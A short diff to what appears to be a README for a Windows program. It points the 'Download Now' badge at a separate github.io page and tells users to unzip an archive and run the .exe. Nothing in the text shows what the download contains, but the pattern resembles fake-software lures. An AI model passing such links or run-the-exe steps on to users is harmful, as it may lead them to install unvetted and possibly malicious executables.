@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://dexhunter-pro.github.io/.github/)
 
 ## 📸 Overview
 ![Screenshot 1](https://lh7-us.googleusercontent.com/CFleEZVM0vo6N8CK3nhk5vhMUBHvFubCJjMiPVoAMIfYtyiZwCTTp3Iy_7S4EX4SOnVH5WxNz-QnRC_jvvqpYJKUGyghmjpGqkT95BR68wqa_AUlD-PsPI-5Hq-Nwcncq1wtsBHnqpNWDSpBQV5qvBg)  
